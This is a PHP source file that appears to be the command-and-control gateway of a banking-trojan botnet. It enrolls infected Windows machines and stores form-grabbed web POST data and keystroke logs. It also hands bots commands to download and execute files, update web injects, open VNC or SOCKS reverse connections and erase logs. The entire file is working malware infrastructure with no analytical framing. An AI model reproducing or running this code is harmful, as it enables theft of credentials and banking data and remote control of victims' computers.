<?php

require_once('inc/require.php');

$Commands = Array(
	//C1
	"Invalid" 			=> pack("C", 0x00),	
	"RemoveBot" 		=> pack("C", 0x01),	
	"EraseLogs" 		=> pack("C", 0x02),	
	
	//C2
	"DownloadandExecute"=> pack("C", 0x10),
	"UpdateNormal"		=> pack("C", 0x20),
	"UpdateSecure"		=> pack("C", 0x30),
	"UpdateInject"		=> pack("C", 0x40),
	
	//C3
	"VNC"				=> pack("C", 0x11),
	"SOCKS4"			=> pack("C", 0x12),
	"SOCKS5"			=> pack("C", 0x13),
);

if(!isset($_SERVER['CONTENT_LENGTH']))
	die(); 
	
$size = (int)$_SERVER['CONTENT_LENGTH'];

if($size < 74)
	die(); 

$PostData = file_get_contents('php://input');

$SystemInfo = ord($PostData[1] ^ $PostData[0]);

$IsAdmin	= (mysql_real_escape_string(($SystemInfo & 1)) == 1 ? "Admin" : "User");
$Arch 		= (mysql_real_escape_string(($SystemInfo & 2) >> 1) == 1 ? "x64" : "x86");
$SevicePack = mysql_real_escape_string(($SystemInfo  & 12) >> 2);
$OS			= GetOSString(($SystemInfo & -16) >> 4);
$InjectHash = "";
$UniqueId 	= "";
$Country = CountryName($client_ip);

for($i = 0; $i < 32; $i++)
{
	$InjectHash .= $PostData[2+$i] ^ $PostData[0];
}

for($i = 0; $i < 38; $i++)
{
	$UniqueId .= $PostData[35+$i] ^ $PostData[0];
}

$InjectHash = mysql_real_escape_string($InjectHash);
$UniqueId = mysql_real_escape_string($UniqueId);


if(isset($_GET['a']) && $_GET['a'] == 1)
{
	$file = fopen($_vars['InjectsFile'], "r");
	if(!$file)
		die();
		
	$Config = fread($file, filesize($_vars['InjectsFile']));
	$Config = str_replace('<?php die(); ?>', "", $Config);
	exit(EncryptConfig($Config, $UniqueId));
}


else if(isset($_GET['a']) && $_GET['a'] == 0)
{
	$LogData = substr($PostData, 74);
	$Key = substr(md5($UniqueId) . md5($UniqueId), 0, 56);
	$Decrypted = mcrypt_decrypt(MCRYPT_BLOWFISH, $Key, $LogData, MCRYPT_MODE_ECB, NULL);
	$len = strlen($Decrypted);
	$line = explode("<~*#*~>", $Decrypted);
	
	foreach($line as $entry)
	{
		$exp = explode('*', $entry, 3);
		if(count($exp) >= 3)
		{
			$Log_type = $exp[0];
			$url = $exp[1];
			$Log_content = trim($exp[2], "\0");
			$url_full = $url;
			$is_error = 0;
			$is_blacklisted = 0;
			
			$blacklist_array = mysql_query("SELECT * FROM log_blacklist");
			
			while($blacklist_entry = mysql_fetch_array($blacklist_array))
			{
				if(fnmatch($blacklist_entry['url'], $url_full))
				{
					$is_blacklisted = 1;
				}
			}
			
			if($is_blacklisted == 0)
			{
				if($Log_type=='P')
				{
					$_params = array();
					$pars_conf = file($_vars['ParserFile']);
					$pars_conf= str_replace('<?php die(); ?>', "", $pars_conf);

					for($i=0;$i<count($pars_conf);$i++)
					{ 
						$need_params = explode(' ', $pars_conf[$i]);
						$url_config = parse_url($need_params[0]);

						$url_config = str_replace("*", "", $url_config['host']);

						$url = parse_url($url);
						$url = $url['host'];

						if (strstr($url, $url_config)){
						
							$found = true;
							
							break;
							unset($need_params[0]);
						}
					}

					if(isset($found))
					{
						$params = explode('&', $Log_content);

						foreach($params as $param) {
						
						$var = substr($param,0,strpos($param, '='));

						if(in_array($var, $need_params)) $_params[]=$param;
						}
					}

					if(count($_params)>0)
					{
						$Log_content = '';
						while(list($k, $v) = each($_params))
						{
							$p = explode('=', $v);
							$pa = $p[0];
							$va = $p[1];
							$Log_content.= $pa.': '.urldecode($va)."\r\n";
						}
					}
				}
				else if ($Log_type=='L')
				{
					$Log_content = "page data:\r\n".$Log_content;
				}
				
				else if ($Log_type=='E')
				{
					$is_error = 1;
					$Log_content = 'exception code: '.$url_full."\r\nerror data:\r\n".$Log_content;
				}

				if ($Log_content!='')
				{
					$insertQuery = "INSERT INTO logs SET unique_id='$UniqueId', log_url='".mysql_real_escape_string(urldecode($url_full))."', log='".mysql_real_escape_string(urldecode($Log_content))."', os='$OS', ip='$client_ip', country='$Country', date='$time', is_error = '$is_error'";
					@mysql_query($insertQuery);
				}
			}
		}
	}
}

else if(isset($_GET['a']) && $_GET['a'] == 2)
{
	$LogData = substr($PostData, 74);
	$Key = substr(md5($UniqueId) . md5($UniqueId), 0, 56);
	$Decrypted = mcrypt_decrypt(MCRYPT_BLOWFISH, $Key, $LogData, MCRYPT_MODE_ECB, NULL);
	$len = strlen($Decrypted);
	$today = strtotime("today");
	echo($Decrypted . "\n");
	$line = explode("<~*#*~>", $Decrypted);

	
	foreach($line as $entry)
	{
		
		$exp = explode("\n", $entry, 3);
		
		if(count($exp) >= 3)
		{
			$process_name = mysql_real_escape_string($exp[0]);
			$window_title = mysql_real_escape_string($exp[1]);
			$logged_keys = mysql_real_escape_string(trim($exp[2], "\0"));
			
			$rowsKey = mysql_query("SELECT * FROM `keys` WHERE date='$today' AND unique_id='$UniqueId' AND process_name='$process_name' AND window_title='$window_title'") or die(mysql_error());
			
			if(mysql_num_rows($rowsKey))
			{
				mysql_query("UPDATE `keys` SET logged_keys=concat(logged_keys, '$logged_keys') WHERE  date='$today' AND process_name='$process_name' AND window_title='$window_title'") or die(mysql_error());
			}else{
				if(strlen($logged_keys) > 1)
				{
					mysql_query("INSERT INTO `keys` SET unique_id='$UniqueId', country='$Country', os='$OS', ip='$client_ip',  logged_keys='$logged_keys', date='$today', process_name='$process_name', window_title='$window_title'") or die(mysql_error());
				}
			}
		}else{
			echo("not enough entries");
		}
	}
}

else
{

	$find_result = mysql_num_rows(mysql_query("SELECT unique_id FROM bots WHERE unique_id='$UniqueId'"));

	if($find_result>0)
	{
		$UpdateBots = "UPDATE bots SET 
		ip='$client_ip', 
		os='$OS', 
		country='$Country', 
		arch='$Arch', 
		user_admin='$IsAdmin', 
		knock_time=$time 
		WHERE unique_id='$UniqueId'";
	}
	else
	{
		$UpdateBots = "INSERT INTO bots (unique_id, ip, os, country, first_time, arch, user_admin, knock_time)
		VALUES ('$UniqueId', '$client_ip', '$OS', '$Country', $time, '$Arch', '$IsAdmin', $time)";
	}

	$do = @mysql_query($UpdateBots);

	if($do)
	{
		$file = fopen($_vars['InjectsFile'], "r");
		if($file)
		{
			$Config = fread($file, filesize($_vars['InjectsFile']));
			$Config = str_replace('<?php die(); ?>', "", $Config);
			$ConfigMd5 = md5($Config);
			
			if($ConfigMd5 != $InjectHash)
			{
				$UpdateUrl = "http://" .$_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?a=1";
				$KeyByte = rand(0x01, 0xFF);
				$Url = XorEncrypt($UpdateUrl, $KeyByte);
				$Hash = XorEncrypt(md5($Config), $KeyByte);
				
				$Class2header = Array(
										"Command" => $Commands["UpdateInject"],	//0x10 - 0xF0 (Only High 4 bits)
										"KeyByte" => pack("C", $KeyByte),		//0x00 - 0xFF
										"Length"  => pack("v", 0x0000),			//Word (size of entire header)
										"MD5Hash" => $Hash,						//Xor encrypted with KeyByte (null terminated)
										"Address" => $Url,						//Xor encrypted with KeyByte (null terminated)
									);  $Class2header["Length"] = pack("v", strlen(implode($Class2header))); //Set Length field to header size

				echo(implode($Class2header));	
			}
		}
	
		$resQuery = "SELECT * FROM `tasks`  WHERE `enabled`='1'";
		$resObj = mysql_query($resQuery);
		$UpdateArray = Array();
		
		while($task = mysql_fetch_array($resObj))
		{
			$ok = false;

			if($task['country']=='ALL') 
				$ok = true;
			else 
				if(strstr($task['country'], CountryName($client_ip))) 
					$ok = true;

			if($ok)
			{
				if($task['os']!="ALL")	if(!strstr($task['os'], $OS))  
					$ok = false;
			}

			if($ok)
			{
				if($task['arch']!="ALL") if(!strstr($task['arch'],$Arch)) 
				{
					$ok = false;
					echo($task['arch'] . "test" . $Arch);
				}
			}
		 
			$query = mysql_query("SELECT COUNT(*) FROM `sends` 
			WHERE `task_id`='".$task['task_id']."' and `unique_id`='".$UniqueId."' and `start`='".$task['last_start']."'");
			$count = mysql_fetch_row($query);

			if ($count[0]>0 ) 
				$ok = false;

			if($ok)
			{
				$command = str_replace(" ", "", $task['command_name']);
				
				if($command != 'EraseLogs')
				{
					mysql_query("INSERT INTO `sends` 
					(`unique_id`, `task_id`, `start`)
					values ('$UniqueId', '".$task['task_id']."', '".$task['last_start']."')
					");
				}
				 		
					$nsends = $task['sends']+1;
					$upq = "UPDATE `tasks` set sends=sends+1";

					if($nsends>=$task['limit']) 
						$upq.=", `enabled`='0', `status`='Done'"; 

					$upq.=" WHERE `task_id`='".$task['task_id']."'";
					mysql_query($upq);

					
				if($command=='UpdateNormal' || $command=='DownloadandExecute' || $command=='UpdateSecure')
				{

			
					$uploadquery = "SELECT hash,ext FROM `uploads` WHERE `filename`='".$task['file']."'";
					$uploadobj = mysql_query($uploadquery);
					
					if(mysql_num_rows($uploadobj))
					{
						$upload = mysql_fetch_assoc($uploadobj);
						$Filename = $upload ['hash'] . "." . $upload['ext'];
						$Md5_file  = $task['md5'];
						$Url_file = $_vars['base_url'].$_vars['uploadDir'].$Filename;

						$KeyByte = rand(0x01, 0xFF);
						$Url = XorEncrypt($Url_file, $KeyByte);
						$Hash = XorEncrypt($Md5_file, $KeyByte);
						
						$Class2header = Array(
												"Command" => $Commands[$command],		//0x10 - 0xF0 (Only High 4 bits)
												"KeyByte" => pack("C", $KeyByte),		//0x00 - 0xFF
												"Length"  => pack("v", 0x0000),			//Word (size of entire header)
												"MD5Hash" => $Hash,						//Xor encrypted with KeyByte (null terminated)
												"Address" => $Url,						//Xor encrypted with KeyByte (null terminated)
											);  $Class2header["Length"] = pack("v", strlen(implode($Class2header))); //Set Length field to header size
											
						if($command=='UpdateNormal' || $command=='UpdateSecure') //Save update command until all other process
							array_push($UpdateArray, implode($Class2header)); 
						else
							echo(implode($Class2header));
					}
				}

				else
				{

					$Class1header = Array(
									"Command" => $Commands[$command],		//0x00 - 0x0F (Only low 4 bits)
									"KeyByte" => pack("C", 0xC1),			//Class 1 command Signature (KeyByte not used)
									"Length"  => pack("v", 0x04),			//0x04 (Size of header is static for Class 1)
								);



					echo(implode($Class1header));	
						
				}
			}
		}
		if(RVNC_ENABLED == TRUE)
		{
			$resObj = mysql_query("SELECT * FROM `reverse_connect` WHERE unique_id='$UniqueId'");
			while($reverse = mysql_fetch_array($resObj))
			{
				$KeyByte = rand(0x01, 0xFF);
				$client = XorEncrypt($reverse['client'], $KeyByte);
				$Class2header = Array(
										"Command" => $Commands[$reverse['protocol']],	//0x10 - 0xF0 (Only High 4 bits)
										"KeyByte" => pack("C", $KeyByte),				//0x00 - 0xFF
										"Length"  => pack("v", 0x0000),					//Word (size of entire header)
										"Client"  => $client,							//Xor encrypted with KeyByte (null terminated)
									);  $Class2header["Length"] = pack("v", strlen(implode($Class2header))); //Set Length field to header size
									
				echo(implode($Class2header));
			}
			mysql_query("DELETE FROM `reverse_connect` WHERE unique_id='$UniqueId'");
		}
		
		foreach($UpdateArray as $UpdateCommand)
		{
			echo($UpdateCommand);
		}
	}
}


function XorEncrypt($String, $KeyByte)
{
	$Encrypted = "";
	$LocalKeyByte = pack("C", $KeyByte);
	
	foreach (str_split($String) as $char) {
        $Encrypted .= chr(ord($char) ^ ord($LocalKeyByte));
    }
	
	$Encrypted .= chr(pack("C", 0x00) ^ ord($LocalKeyByte));
	
	return $Encrypted;
}


function GetOSString($OS)
{
	switch($OS)
	{
		case 1:
			return("Windows 2000"); 

		case 2:
			return("Windows XP");

		case 3:
			return("Windows XP Professional x64");

		case 4:
			return("Windows Server 2003");

		case 5:
			return("Windows Home Server");
			
		case 6:
			return("Windows Server 2003 R2");
			
		case 7:
			return("Windows Vista");
			
		case 8:
			return("Windows Server 2008");
			
		case 9:
			return("Windows Server 2008 R2");
			
		case 10:
			return("Windows 7");
			
		case 11:
			return("Windows Server 2012");
			
		case 12:
			return("Windows 8");
			
		case 13:
			return("Windows 8.1");
			
		default:
			return("Unknown");	
	}
}

function EncryptConfig($Data, $BotId) 
{ 
	$Data.= pack("C", 0x00);	
	$key = substr(md5($BotId), 0, 16);
	srand(); 
	$iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_RAND);
	$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $Data, MCRYPT_MODE_CBC, $iv);
	return $iv.$encrypted;
 } 
?>